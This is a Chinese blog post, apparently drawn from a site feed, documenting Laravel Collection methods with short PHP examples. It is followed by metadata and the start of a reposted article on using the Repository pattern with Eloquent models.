contains判断集合是否包含给定的项目。 基本用法： 123$collection = collect(['name' =&gt; 'boo', 'age' =&gt; 25]);$collection-&gt;contains('boo'); // true$collection-&gt;contains('yumi'); // false 也可以用 contains 方法匹配一对键/值，即判断给定的配对是否存在于集合中： 123456$collection = collect([ ['name' =&gt; 'boo', 'age' =&gt; 25], ['name' =&gt; 'yumi', 'age' =&gt; 23],]);$collection-&gt;contains(\"name\", \"mac\"); // false 也可以传递一个回调到 contains 方法来执行自己的真实测试： 123456$collection = collect([1, 2, 3, 4, 5]);// $value: 1 $key: 0$collection-&gt;contains(function ($value, $key) &#123; return $value &gt; 5;&#125;); // false contains 方法在检查项目值时使用「宽松」比较，意味着具有整数值的字符串将被视为等于相同值的整数。 相反 containsStrict 方法则是使用「严格」比较进行过滤。 containsStrict使用「严格模式」判断集合是否包含给定的项目： 基本使用： 123456$collection = collect([ ['name' =&gt; 'boo', 'age' =&gt; 25], ['name' =&gt; 'yumi', 'age' =&gt; 23],]);$collection-&gt;containsStrict(\"age\", \"25\"); // false 如上例所示，数组值存在，但是值类型不一致也返回false。 count返回该集合内的项目总数。 1collect([1, 2, 3, 4])-&gt;count(); // 4 countBy统计集合中每个元素出现的次数。 基本用法： 1234$collection = collect([1, 2, 2, 2, 3, 5, 5]);$counted = $collection-&gt;countBy();$counted-&gt;all();// [1 =&gt; 1, 2 =&gt; 3, 3 =&gt; 1, 5=&gt;2] 进阶用法，自定义规则，统计元素出现的次数： 123456$collection &#x3D; collect([&#39;alice@gmail.com&#39;, &#39;bob@yahoo.com&#39;, &#39;carlos@gmail.com&#39;]);$counted &#x3D; $collection-&gt;countBy(function ($email) &#123; return substr(strrchr($email, &quot;@&quot;), 1);&#125;);$counted-&gt;all();&#x2F;&#x2F; [&#39;gmail.com&#39; &#x3D;&gt; 2, &#39;yahoo.com&#39; &#x3D;&gt; 1] crossJoin返回指定集合的可能的笛卡尔积。 123456789101112131415161718192021222324252627282930313233$collection = collect([1, 2]);$matrix = $collection-&gt;crossJoin(['a', 'b']);$matrix-&gt;all();/* [ [1, 'a'], [1, 'b'], [2, 'a'], [2, 'b'], ]*/$collection = collect([1, 2]);$matrix = $collection-&gt;crossJoin(['a', 'b'], ['I', 'II']);$matrix-&gt;all();/* [ [1, 'a', 'I'], [1, 'a', 'II'], [1, 'b', 'I'], [1, 'b', 'II'], [2, 'a', 'I'], [2, 'a', 'II'], [2, 'b', 'I'], [2, 'b', 'II'], ]*/ dd备份文件系统和停止系统（dump and die）的缩写，打印集合元素并中断脚本执行。 12$collection = collect(['John Doe', 'Jane Doe']);$collection-&gt;dd(); 如果不想中断执行脚本，请使用dump方法替代。 diff与给定的集合或者数组进行比较，基于值求差集。 将集合与其它集合或纯 PHP 数组进行值的比较，然后返回原集合中存在而给定集合中不存在的值： 12$collection = collect([1, 2, 3, 4, 5]);$collection-&gt;diff([2, 4, 6, 8])-&gt;all(); // [1, 3, 5] diffAssoc与给定的集合或者数组进行比较，基于键值对求差集。 返回原集合不存在于给定集合中的键值对： 1234567891011121314$collection = collect([ 'color' =&gt; 'orange', 'type' =&gt; 'fruit', 'remain' =&gt; 6]);$diff = $collection-&gt;diffAssoc([ 'color' =&gt; 'yellow', 'type' =&gt; 'fruit', 'remain' =&gt; 3, 'used' =&gt; 6]);$diff-&gt;all(); // ['color' =&gt; 'orange', 'remain' =&gt; 6] diffKeys与给定的集合或者数组进行比较，基于键求差集。 返回原集合中存在而给定的集合中不存在「键」所对应的键值对： 12345678910111213141516$collection = collect([ 'one' =&gt; 10, 'two' =&gt; 20, 'three' =&gt; 30, 'four' =&gt; 40, 'five' =&gt; 50,]);$diff = $collection-&gt;diffKeys([ 'two' =&gt; 2, 'four' =&gt; 4, 'six' =&gt; 6, 'eight' =&gt; 8,]);$diff-&gt;all(); // ['one' =&gt; 10, 'three' =&gt; 30, 'five' =&gt; 50] duplicates从集合中检索并返回重复的值。 基本用法： 123$collection = collect(['a', 'b', 'a', 'c', 'b']);$collection-&gt;duplicates();// [2 =&gt; 'a', 4 =&gt; 'b'] 如果集合包含数组或对象，则可以传递希望检查重复值的属性的键： 12345678$employees = collect([ ['email' =&gt; 'abigail@example.com', 'position' =&gt; 'Developer'], ['email' =&gt; 'james@example.com', 'position' =&gt; 'Designer'], ['email' =&gt; 'victoria@example.com', 'position' =&gt; 'Developer'],])$employees-&gt;duplicates('position');// [2 =&gt; 'Developer'] duplicates 方法在检查项目值时使用「宽松」比较，相反duplicatesStrict 方法则是使用「严格」比较进行过滤。 each迭代集合中的内容并将其传递到回调函数中。 123456$collection = $collection-&gt;each(function ($item, $key) &#123; // 如果要中断对内容的迭代，那就从回调中返回 false if (/* some condition */) &#123; return false; &#125;&#125;); eachSpread同样是遍历集合，不过与each 的区别在于，对于多维数组，可以直接拿到元素。 12345678910111213141516171819202122$collection = collect([['Boo', 25, \"men\"], ['Yumi', 23, \"woman\"]]);$collection-&gt;eachSpread(function ($name, $age, $gender) &#123; var_dump($name, $age, $gender); // Boo、25、men // Yumi、23、woman&#125;);$collection-&gt;each(function ($item, $key)&#123; // 同样可以在回调函数中，返回false ，终止循环 var_dump($item, $key);&#125;);/* array(3) &#123; [0]=&gt; string(3) \"Boo\" [1]=&gt; int(25) [2]=&gt; string(3) \"men\" &#125;*/ every检查集合中的每一个元素是否通过指定条件： 12345collect([1, 2, 3, 4])-&gt;every(function ($value, $key) &#123; return $value &gt; 2;&#125;);&#x2F;&#x2F; false 注意：如果集合为空， every 将返回 true。 except返回集合中除了指定键以外的所有项目。 123$collection = collect(['product_id' =&gt; 1, 'price' =&gt; 100, 'discount' =&gt; false]);$filtered = $collection-&gt;except(['price', 'discount']);$filtered-&gt;all(); // ['product_id' =&gt; 1] 与之相反的方法是 only()。 filter使用给定的回调函数过滤集合的内容，只留下那些通过的元素。 123456$collection = collect([1, 2, 3, 4]);$filtered = $collection-&gt;filter(function ($value, $key) &#123; // 当闭包返回true 时，保留一个条目 return $value &gt; 2;&#125;);$filtered-&gt;all(); // [3, 4] 如果没有提供回调函数，集合中所有返回false的元素都会被移除： 12$collection = collect([1, 2, 3, null, false, '', 0, []]);$collection-&gt;filter()-&gt;all(); // [1, 2, 3] 与之相反的方法是 reject()。 first返回集合中的第一个元素。 基本用法： 1collect([1, 2, 3, 4])-&gt;first(); // 1 同样可以传入回调函数，进行条件限制： 1234collect([1, 2, 3, 4])-&gt;first(function ($value, $key) &#123; // 当闭包返回true 时，保留一个条目 return $value &gt; 2;&#125;); // 3 如果需要返回最后一个元素可以使用last() 方法。 firstWhere返回集合中含有指定键 / 值对的第一个元素： 12345678910$collection = collect([ ['name' =&gt; 'Regena', 'age' =&gt; null], ['name' =&gt; 'Linda', 'age' =&gt; 14], ['name' =&gt; 'Diego', 'age' =&gt; 23], ['name' =&gt; 'Linda', 'age' =&gt; 84],]);// 返回name = Linda 的第一个元素$collection-&gt;firstWhere('name', 'Linda');// ['name' =&gt; 'Linda', 'age' =&gt; 14] 还可以在firstWhere 中使用算术运算符： 12$collection-&gt;firstWhere('age', '&gt;=', 18);// ['name' =&gt; 'Diego', 'age' =&gt; 23] 和 where 方法一样，你可以将一个参数传递给 firstWhere 方法。在这种情况下， firstWhere 方法将返回指定键的值为「真」的第一个集合项： 12$collection-&gt;firstWhere('age');// ['name' =&gt; 'Linda', 'age' =&gt; 14] firstMap遍历集合并将其中的每个值传递到给定的回调。 可以通过回调修改每个值的内容再返回出来，从而形成一个新的被修改过内容的集合： 12345678910$collection = collect([ ['name' =&gt; 'Sally'], ['school' =&gt; 'Arkansas'], ['age' =&gt; 28]]);$flattened = $collection-&gt;flatMap(function ($values) &#123; return array_map('strtoupper', $values);&#125;);$flattened-&gt;all();// ['name' =&gt; 'SALLY', 'school' =&gt; 'ARKANSAS', 'age' =&gt; '28']; flatten将多维集合转为一维。 基本用法： 123$collection = collect(['name' =&gt; 'taylor', 'languages' =&gt; ['php', 'javascript']]);$collection-&gt;flatten()-&gt;all(); // ['taylor', 'php', 'javascript']; 还可以选择性地传入「深度」参数： 12345678910111213141516171819$collection = collect([ 'Apple' =&gt; [ ['name' =&gt; 'iPhone 6S', 'brand' =&gt; 'Apple'], ], 'Samsung' =&gt; [ ['name' =&gt; 'Galaxy S7', 'brand' =&gt; 'Samsung'] ],]);$products = $collection-&gt;flatten(1);$products-&gt;values()-&gt;all();/*[ ['name' =&gt; 'iPhone 6S', 'brand' =&gt; 'Apple'], ['name' =&gt; 'Galaxy S7', 'brand' =&gt; 'Samsung'],]*/ 在这个例子里，调用 flatten 方法时不传入深度参数的话也会将嵌套数组转成一维的，然后返回 [&#39;iPhone 6S&#39;, &#39;Apple&#39;, &#39;Galaxy S7&#39;, &#39;Samsung&#39;]，传入深度参数能限制设置返回数组的层数。 flip键值反转。 12$collection = collect([\"name\" =&gt; \"boo\", \"age\" =&gt; 25]);$collection-&gt;flip()-&gt;all(); // [\"boo\" =&gt; \"name\", 25 =&gt; \"age\"] forget通过给定的键来移除掉集合中对应的内容。 1234$collection = collect(['name' =&gt; 'taylor', 'framework' =&gt; 'laravel']);$collection-&gt;forget('name');$collection-&gt;all(); // ['framework' =&gt; 'laravel'] 与大多数集合的方法不同，forget() 不会返回修改过后的新集合；它会直接修改原来的集合。 get返回给定键的项目。 基本用法，如果该键不存在，则返回 null： 12$collection = collect(['name' =&gt; 'taylor', 'framework' =&gt; 'laravel']);$value = $collection-&gt;get('name'); // taylor 可以传递第二个参数作为默认值： 12$collection = collect(['name' =&gt; 'taylor', 'framework' =&gt; 'laravel']);$value = $collection-&gt;get('foo', 'boo'); // boo 甚至可以将回调函数当作默认值。如果指定的键不存在，就会返回回调的结果： 12345$collection = collect(['name' =&gt; 'taylor', 'framework' =&gt; 'laravel']);$collection-&gt;get('email', function () &#123; return 'boo';&#125;); // boo groupBy根据给定的键对集合内的项目进行分组。 基本用法： 123456789101112131415161718192021$collection = collect([ ['account_id' =&gt; 'account-x10', 'product' =&gt; 'Chair'], ['account_id' =&gt; 'account-x10', 'product' =&gt; 'Bookcase'], ['account_id' =&gt; 'account-x11', 'product' =&gt; 'Desk'],]);$grouped = $collection-&gt;groupBy('account_id');$grouped-&gt;all();/* [ 'account-x10' =&gt; [ ['account_id' =&gt; 'account-x10', 'product' =&gt; 'Chair'], ['account_id' =&gt; 'account-x10', 'product' =&gt; 'Bookcase'], ], 'account-x11' =&gt; [ ['account_id' =&gt; 'account-x11', 'product' =&gt; 'Desk'], ], ]*/ 同样可以传入一个回调函数来代替字符串的『键』，根据该回调函数的返回值来进行分组： 1234567891011121314151617$grouped = $collection-&gt;groupBy(function ($item, $key) &#123; return substr($item['account_id'], -3);&#125;);$grouped-&gt;all();/* [ 'x10' =&gt; [ ['account_id' =&gt; 'account-x10', 'product' =&gt; 'Chair'], ['account_id' =&gt; 'account-x10', 'product' =&gt; 'Bookcase'], ], 'x11' =&gt; [ ['account_id' =&gt; 'account-x11', 'product' =&gt; 'Desk'], ], ]*/ 甚至可以传入一个数组进行多层分组： 1234567891011121314151617181920212223242526272829303132333435363738$data = new Collection([ 10 =&gt; ['user' =&gt; 1, 'skill' =&gt; 1, 'roles' =&gt; ['Role_1', 'Role_3']], 20 =&gt; ['user' =&gt; 2, 'skill' =&gt; 1, 'roles' =&gt; ['Role_1', 'Role_2']], 30 =&gt; ['user' =&gt; 3, 'skill' =&gt; 2, 'roles' =&gt; ['Role_1']], 40 =&gt; ['user' =&gt; 4, 'skill' =&gt; 2, 'roles' =&gt; ['Role_2']],]);$result = $data-&gt;groupBy([ 'skill', function ($item) &#123; return $item['roles']; &#125;,], $preserveKeys = true);/*[ 1 =&gt; [ 'Role_1' =&gt; [ 10 =&gt; ['user' =&gt; 1, 'skill' =&gt; 1, 'roles' =&gt; ['Role_1', 'Role_3']], 20 =&gt; ['user' =&gt; 2, 'skill' =&gt; 1, 'roles' =&gt; ['Role_1', 'Role_2']], ], 'Role_2' =&gt; [ 20 =&gt; ['user' =&gt; 2, 'skill' =&gt; 1, 'roles' =&gt; ['Role_1', 'Role_2']], ], 'Role_3' =&gt; [ 10 =&gt; ['user' =&gt; 1, 'skill' =&gt; 1, 'roles' =&gt; ['Role_1', 'Role_3']], ], ], 2 =&gt; [ 'Role_1' =&gt; [ 30 =&gt; ['user' =&gt; 3, 'skill' =&gt; 2, 'roles' =&gt; ['Role_1']], ], 'Role_2' =&gt; [ 40 =&gt; ['user' =&gt; 4, 'skill' =&gt; 2, 'roles' =&gt; ['Role_2']], ], ],];*/ has判断集合中是否存在给定的键。 12$collection = collect([\"name\" =&gt; \"boo\", \"age\" =&gt; 25]);$collection-&gt;has(\"name\"); // true implode合并集合中的项目。 implode 方法用于合并集合项。其参数取决于集合项的类型。如果集合包含数组或对象，你应该传递你希望合并的属性的键，以及你希望放在值之间用来「拼接」的字符串： 1234567$collection = collect([ ['account_id' =&gt; 1, 'product' =&gt; 'Desk'], ['account_id' =&gt; 2, 'product' =&gt; 'Chair'],]);$collection-&gt;implode('product', ', ');// Desk, Chair 如果集合中包含简单的字符串或数值，只需要传入「拼接」用的字符串作为该方法的唯一参数即可： 123collect([1, 2, 3, 4, 5])-&gt;implode('-');// '1-2-3-4-5' intersect从原集合中移除不在给定数组或集合中的『任何值』，返回新的集合将保留原集合的键。 1234$collection = collect(['Desk', 'Sofa', 'Chair']);$intersect = $collection-&gt;intersect(['Desk', 'Chair', 'Bookcase']);$intersect-&gt;all();// [0 =&gt; 'Desk', 2 =&gt; 'Chair'] intersectKey删除原集合中不存在于给定数组或集合中的『任何键』，返回新的集合将保留原集合的键。 123456789$collection = collect([ 'serial' =&gt; 'UX301', 'type' =&gt; 'screen', 'year' =&gt; 2009,]);$intersect = $collection-&gt;intersectByKeys([ 'reference' =&gt; 'UX404', 'type' =&gt; 'tab', 'year' =&gt; 2011,]);$intersect-&gt;all();// ['type' =&gt; 'screen', 'year' =&gt; 2009] isEmpty判断集合是否为空。 1collect([])-&gt;isEmpty(); // true isNotEmpty判断集合是否不为空。 1collect([])-&gt;isEmpty(); // false join将集合中的值用字符串连接。 12345collect(['a', 'b', 'c'])-&gt;join(', '); // 'a, b, c'collect(['a', 'b', 'c'])-&gt;join(', ', ', and '); // 'a, b, and c'collect(['a', 'b'])-&gt;join(', ', ' and '); // 'a and b'collect(['a'])-&gt;join(', ', ' and '); // 'a'collect([])-&gt;join(', ', ' and '); // '' keyBy以给定的键作为集合的键。 123456789101112131415$collection = collect([ ['product_id' =&gt; 'prod-100', 'name' =&gt; 'Desk'], ['product_id' =&gt; 'prod-200', 'name' =&gt; 'Chair'],]);$keyed = $collection-&gt;keyBy('product_id');$keyed-&gt;all();/* [ 'prod-100' =&gt; ['product_id' =&gt; 'prod-100', 'name' =&gt; 'Desk'], 'prod-200' =&gt; ['product_id' =&gt; 'prod-200', 'name' =&gt; 'Chair'], ]*/ 还可以在这个方法传递一个回调函数。该回调函数返回的值会作为该集合的键： 123456789101112$keyed = $collection-&gt;keyBy(function ($item) &#123; return strtoupper($item['product_id']);&#125;);$keyed-&gt;all();/* [ 'PROD-100' =&gt; ['product_id' =&gt; 'prod-100', 'name' =&gt; 'Desk'], 'PROD-200' =&gt; ['product_id' =&gt; 'prod-200', 'name' =&gt; 'Chair'], ]*/ keys返回集合的所有键。 12$collection = collect([\"name\" =&gt; \"boo\", \"age\" =&gt; 25]);$collection-&gt;keys()-&gt;all(); // [\"name\", \"age\"] last返回集合中通过给定真实测试的最后一个元素，与first 方法正好相反。 1234collect([1, 2, 3, 4])-&gt;last(function ($value, $key) &#123; return $value &lt; 3;&#125;);// 2 map遍历集合并将每一个值传入给定的回调，返回新的集合。 12345678$collection = collect([1, 2, 3, 4, 5]);$multiplied = $collection-&gt;map(function ($item, $key) &#123; return $item * 2;&#125;);$multiplied-&gt;all();// [2, 4, 6, 8, 10] 与其他大多数集合方法一样， map 会返回一个新的集合实例；它不会修改原集合。如果你想修改原集合，请使用 transform 方法。 mapToGroups通过指定回调函数对集合进行分组， 123456789101112131415161718192021222324252627282930$collection = collect([ [ 'name' =&gt; 'John Doe', 'department' =&gt; 'Sales', ], [ 'name' =&gt; 'Jane Doe', 'department' =&gt; 'Sales', ], [ 'name' =&gt; 'Johnny Doe', 'department' =&gt; 'Marketing', ]]);$grouped = $collection-&gt;mapToGroups(function ($item, $key) &#123; return [$item['department'] =&gt; $item['name']];&#125;);$grouped-&gt;all();/* [ 'Sales' =&gt; ['John Doe', 'Jane Doe'], 'Marketing' =&gt; ['Johnny Doe'], ]*/$grouped-&gt;get('Sales')-&gt;all();// ['John Doe', 'Jane Doe'] mapWithKeys遍历集合并将每个值传入给定的回调。 max返回指定键的最大值。 12$max = collect([['foo' =&gt; 10], ['foo' =&gt; 20]])-&gt;max('foo'); // 20$max = collect([1, 2, 3, 4, 5])-&gt;max(); // 5 median返回指定键的中间值。 12$median = collect([['foo' =&gt; 10], ['foo' =&gt; 10], ['foo' =&gt; 20], ['foo' =&gt; 40]])-&gt;median('foo'); // 15$median = collect([1, 1, 2, 4])-&gt;median(); // 1.5 merge将给定数组或集合合并到原集合。 如果给定的集合项的字符串键与原集合中的字符串键相匹配，则指定集合项的值将覆盖原集合的值： 1234$collection = collect(['product_id' =&gt; 1, 'price' =&gt; 100]);$merged = $collection-&gt;merge(['price' =&gt; 200, 'discount' =&gt; false]);$merged-&gt;all();// ['product_id' =&gt; 1, 'price' =&gt; 200, 'discount' =&gt; false] 如果给定的集合项为数字，则这些值将会追加在集合的最后： 1234$collection &#x3D; collect([&#39;Desk&#39;, &#39;Chair&#39;]);$merged &#x3D; $collection-&gt;merge([&#39;Bookcase&#39;, &#39;Door&#39;]);$merged-&gt;all();&#x2F;&#x2F; [&#39;Desk&#39;, &#39;Chair&#39;, &#39;Bookcase&#39;, &#39;Door&#39;] min返回指定键的最小值。 1$min = collect([1, 2, 3, 4, 5])-&gt;min(); // 1 mode返回指定键的众数值。 1collect([1, 1, 2, 4])-&gt;mode(); // [1] nth每隔n个元素取一个元素组成一个新的集合。 12345$collection = collect(['a', 'b', 'c', 'd', 'e', 'f']);$collection-&gt;nth(4); // ['a', 'e']// 第二个参数可以作为偏移位置 $collection-&gt;nth(4, 1); // ['b', 'f'] only返回集合中给定键的所有项目。 123$collection = collect(['product_id' =&gt; 1, 'name' =&gt; 'Desk', 'price' =&gt; 100, 'discount' =&gt; false]);$filtered = $collection-&gt;only(['product_id', 'name']);$filtered-&gt;all(); // ['product_id' =&gt; 1, 'name' =&gt; 'Desk'] partition配合list()方法区分回调函数满足和不满足的数据。 1234567$collection = collect([1, 2, 3, 4, 5, 6]);list($underThree, $equalOrAboveThree) = $collection-&gt;partition(function ($i) &#123; return $i &lt; 3;&#125;);$underThree-&gt;all(); // [1, 2]$equalOrAboveThree-&gt;all(); // [3, 4, 5, 6] pipe将集合传给给定的回调并返回结果。 1234$collection &#x3D; collect([1, 2, 3]);$piped &#x3D; $collection-&gt;pipe(function ($collection) &#123; return $collection-&gt;sum();&#125;); &#x2F;&#x2F; 6 pluck获取集合中给定键对应的所有值。 基本用法： 1234567$collection = collect([ ['product_id' =&gt; 'prod-100', 'name' =&gt; 'Desk', \"id\" =&gt; 1], ['product_id' =&gt; 'prod-200', 'name' =&gt; 'Chair', \"id\" =&gt; 2],]);$plucked = $collection-&gt;pluck('name');$plucked-&gt;all(); // ['Desk', 'Chair'] 还可以传入第二个参数作为键值： 12$plucked &#x3D; $collection-&gt;pluck(&#39;name&#39;, &quot;id&quot;);$plucked-&gt;all(); &#x2F;&#x2F; [1 &#x3D;&gt; &#39;Desk&#39;, 2 &#x3D;&gt; &#39;Chair&#39;] pop移除并返回集合中的最后一个项目。 1234$collection = collect([1, 2, 3, 4, 5]);$collection-&gt;pop(); // 5$collection-&gt;all(); // [1, 2, 3, 4] prepend将给定的值添加到集合的开头。 1234$collection = collect([1, 2, 3, 4, 5]);$collection-&gt;prepend(99);$collection-&gt;all(); // [99, 1, 2, 3, 4, 5] 如果是关联数组，也可以传入第二个参数作为键值： 1234$collection = collect(['one' =&gt; 1, 'two' =&gt; 2]);$collection-&gt;prepend(0, 'zero');$collection-&gt;all(); // ['zero' =&gt; 0, 'one' =&gt; 1, 'two' =&gt; 2] pull把给定键对应的值从集合中移除并返回。 1234$collection = collect(['product_id' =&gt; 'prod-100', 'name' =&gt; 'Desk']);$collection-&gt;pull('name'); // 'Desk'$collection-&gt;all(); // ['product_id' =&gt; 'prod-100'] push把给定值添加到集合的末尾。 1234$collection = collect([1, 2, 3, 4]);$collection-&gt;push(5);$collection-&gt;all(); // [1, 2, 3, 4, 5] put在集合内设置给定的键值对。 1234$collection = collect(['product_id' =&gt; 1, 'name' =&gt; 'Desk']);$collection-&gt;put('price', 100);$collection-&gt;all(); // ['product_id' =&gt; 1, 'name' =&gt; 'Desk', 'price' =&gt; 100] random从集合中返回一个随机项。 12$collection = collect([1, 2, 3, 4, 5]);$collection-&gt;random(); // 4 - (retrieved randomly) 也可以传入一个整数用来指定需要需要获取的随机项个数： 1$collection-&gt;random(); // 2, 3, 5 reject使用指定的回调过滤集合。 123456$collection = collect([1, 2, 3, 4]);$filtered = $collection-&gt;reject(function ($value, $key) &#123; return $value &gt; 2;&#125;);$filtered-&gt;all(); // [1, 2] reverse倒转集合中项目的顺序，并保留原始的键值： 12345678910111213$collection = collect(['a', 'b', 'c', 'd', 'e']);$reversed = $collection-&gt;reverse();$reversed-&gt;all();/* [ 4 =&gt; 'e', 3 =&gt; 'd', 2 =&gt; 'c', 1 =&gt; 'b', 0 =&gt; 'a', ]*/ search搜索给定的值并返回它的键，如果没有找到返回 false 123$collection = collect([2, 4, 6, 8]);$collection-&gt;search(4); // 1 shift移除并返回集合的第一个元素。 1234$collection = collect([1, 2, 3, 4, 5]);$collection-&gt;shift(); // 1$collection-&gt;all(); // [2, 3, 4, 5] shuffle随机排序集合中的项目。 1234$collection = collect([1, 2, 3, 4, 5]);$shuffled = $collection-&gt;shuffle();$shuffled-&gt;all(); // [3, 2, 5, 1, 4] - (generated randomly) slice返回集合中给定值后面的部分。 1234$collection = collect([1, 2, 3, 4, 5, 6, 7, 8, 9, 10]);$slice = $collection-&gt;slice(4);$slice-&gt;all(); // [5, 6, 7, 8, 9, 10] 与skip() 方法类似。 sort保留原数组的键，对集合进行排序。 12345$collection = collect([5, 3, 1, 2, 4]);$sorted = $collection-&gt;sort();// 重置索引$sorted-&gt;values()-&gt;all(); // [1, 2, 3, 4, 5] splice删除并返回从给定值后的内容，原集合也会受到影响。 12345$collection = collect([1, 2, 3, 4, 5]);$chunk = $collection-&gt;splice(2);$chunk-&gt;all(); // [3, 4, 5]$collection-&gt;all(); // [1, 2] split将集合按给定的值拆分。 1234$collection = collect([1, 2, 3, 4, 5]);$groups = $collection-&gt;split(3);$groups-&gt;all(); // [[1, 2], [3, 4], [5]] sum返回集合内所有项目的总和。 1collect([1, 2, 3, 4, 5])-&gt;sum(); // 15 take返回给定数量项目的新集合。 1234$collection = collect([0, 1, 2, 3, 4, 5]);$chunk = $collection-&gt;take(3);$chunk-&gt;all(); // [0, 1, 2] times静态times() 方法通过调用给定次数的回调函数来创建新集合： 1234$collection = Collection::times(10, function ($number) &#123; return $number * 9;&#125;);$collection-&gt;all(); // [9, 18, 27, 36, 45, 54, 63, 72, 81, 90] transform迭代集合并对集合内的每个项目调用给定的回调。 123456$collection = collect([1, 2, 3, 4, 5]);$multiplied = $collection-&gt;map(function ($item, $key) &#123; return $item * 2;&#125;);$multiplied-&gt;all(); // [2, 4, 6, 8, 10] 注意：each 只是遍历集合，map 则会返回一个新的集合实例；它不会修改原集合。如果你想修改原集合，请使用 transform 方法。 union将给定的数组添加到集合中。如果给定的数组含有与原集合一样的键，则首选原始集合的值。 1234$collection = collect([1 =&gt; ['a'], 2 =&gt; ['b']]);$union = $collection-&gt;union([3 =&gt; ['c'], 1 =&gt; ['b']]);$union-&gt;all(); // [1 =&gt; ['a'], 2 =&gt; ['b'], 3 =&gt; ['c']] unique返回集合中所有唯一的项目。 基本用法： 12345$collection = collect([1, 1, 2, 2, 3, 4, 2]);$unique = $collection-&gt;unique();// 使用value 重置索引$unique-&gt;values()-&gt;all(); // [1, 2, 3, 4] 当处理嵌套数组或对象时，你可以指定用于确定唯一性的键： 12345678910111213141516$collection = collect([ ['name' =&gt; 'iPhone 6', 'brand' =&gt; 'Apple', 'type' =&gt; 'phone'], ['name' =&gt; 'iPhone 5', 'brand' =&gt; 'Apple', 'type' =&gt; 'phone'], ['name' =&gt; 'Apple Watch', 'brand' =&gt; 'Apple', 'type' =&gt; 'watch'], ['name' =&gt; 'Galaxy S6', 'brand' =&gt; 'Samsung', 'type' =&gt; 'phone'], ['name' =&gt; 'Galaxy Gear', 'brand' =&gt; 'Samsung', 'type' =&gt; 'watch'],]);$unique = $collection-&gt;unique('brand');$unique-&gt;values()-&gt;all();/* [ ['name' =&gt; 'iPhone 6', 'brand' =&gt; 'Apple', 'type' =&gt; 'phone'], ['name' =&gt; 'Galaxy S6', 'brand' =&gt; 'Samsung', 'type' =&gt; 'phone'], ]*/ values返回键被重置为连续编号的新集合。 12$collection = collect([5, 3, 1, 2, 4]);$sorted-&gt;values()-&gt;all(); // [1, 2, 3, 4, 5] when当传入的第一个参数为 true 的时，将执行给定的回调。 1234567891011$collection = collect([1, 2, 3]);$collection-&gt;when(true, function ($collection) &#123; return $collection-&gt;push(4);&#125;);$collection-&gt;all(); // [1, 2, 3, 4]// 当传入的第一个参数不为 true 的时候，将执行给定的回调函数$collection-&gt;unless(false, function ($collection) &#123; return $collection-&gt;push(5);&#125;); where通过给定的键值过滤集合。 123456789101112131415$collection = collect([ ['product' =&gt; 'Desk', 'price' =&gt; 200], ['product' =&gt; 'Chair', 'price' =&gt; 100], ['product' =&gt; 'Bookcase', 'price' =&gt; 150], ['product' =&gt; 'Door', 'price' =&gt; 100],]);$filtered = $collection-&gt;where('price', 100);$filtered-&gt;all();/* [ ['product' =&gt; 'Chair', 'price' =&gt; 100], ['product' =&gt; 'Door', 'price' =&gt; 100], ]*/ whereStrict方法使用严格模式通过给定的键值过滤集合。 whenEmpty当集合为空时，将执行给定的回调函数。 123456$collection = collect(['michael', 'tom']);$collection-&gt;whenEmpty(function ($collection) &#123; return $collection-&gt;push('adam');&#125;);$collection-&gt;all(); // ['michael', 'tom'] 反之whenNotEmpty() 方法当集合不为空时，将执行给定的回调函数。 whereIn通过给定的键值数组来过滤集合。 123456789101112131415$collection = collect([ ['product' =&gt; 'Desk', 'price' =&gt; 200], ['product' =&gt; 'Chair', 'price' =&gt; 100], ['product' =&gt; 'Bookcase', 'price' =&gt; 150], ['product' =&gt; 'Door', 'price' =&gt; 100],]);$filtered = $collection-&gt;whereIn('price', [150, 200]);$filtered-&gt;all();/* [ ['product' =&gt; 'Desk', 'price' =&gt; 200], ['product' =&gt; 'Bookcase', 'price' =&gt; 150], ]*/ 类似方法还有whereNotIn、whereBetween、whereNotInStrict。 whereBetween筛选指定范围内的集合。 1234567891011121314151617$collection = collect([ ['product' =&gt; 'Desk', 'price' =&gt; 200], ['product' =&gt; 'Chair', 'price' =&gt; 80], ['product' =&gt; 'Bookcase', 'price' =&gt; 150], ['product' =&gt; 'Pencil', 'price' =&gt; 30], ['product' =&gt; 'Door', 'price' =&gt; 100],]);$filtered = $collection-&gt;whereBetween('price', [100, 200]);$filtered-&gt;all();/* [ ['product' =&gt; 'Desk', 'price' =&gt; 200], ['product' =&gt; 'Bookcase', 'price' =&gt; 150], ['product' =&gt; 'Door', 'price' =&gt; 100], ]*/ zip将给定数组的值与相应索引处的原集合的值合并在一起。 1234$collection = collect(['Chair', 'Desk']);$zipped = $collection-&gt;zip([100, 200]);$zipped-&gt;all(); // [['Chair', 100], ['Desk', 200]] 参考链接 Laravel 的集合 Collection Laravel 集合——Laravel8.x 中文文档","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"『转载』如何使用Repository 模式","slug":"how-to-use-repository-mode","date":"2021-04-20T13:01:38.000Z","updated":"2021-04-22T15:22:30.359Z","comments":true,"path":"how-to-use-repository-mode/","link":"","permalink":"https://www.0x2beace.com/how-to-use-repository-mode/","excerpt":"若将数据库逻辑都写在 Model 里，会造成 model 代码的臃肿难以维护，基于 SOLID 原则，我们应该使用 Repository 模式辅助 Model，将相关的数据库逻辑封装在不同的 Repository，方便后期项目的维护。","text":"若将数据库逻辑都写在 Model 里，会造成 model 代码的臃肿难以维护，基于 SOLID 原则，我们应该使用 Repository 模式辅助 Model，将相关的数据库逻辑封装在不同的 Repository，方便后期项目的维护。 数据库逻辑在 CURD 中，CUR 比较稳定，但 Read 的部分则变化万千，大部分的数据库逻辑都在描述 Read 部分，若将数据库逻辑写在 Controller 或 Model 都不合适，会造成 Controller 或 Model 代码臃肿，如后难以维护。 Model使用 Repository 模式之后，Model 仅仅当成 Eloquent Class 即可，不需要包含数据库逻辑，仅保留如下部分： Property： 如 $table、$fillable … Mutator： 包括 mutator 与 accessor Method： relation 类的方法，比如使用 hasMany() 与 belongsTo() 单一对应关系： hasOne belongsTo morphTo morphOne 多个对应关系指的是使用以下关键词定义的关联模型： hasMany belongsToMany morphMany morphToMany morphedByMany Repository在开发时常常会在 Controller 直接调用 Model 写数据库逻辑，如下：获取数据库中用户 age&gt;20 的数据。 1234public function index()&#123; return User::where('age','&gt;',20)-&gt;orderBy('age')-&gt;get();&#125; 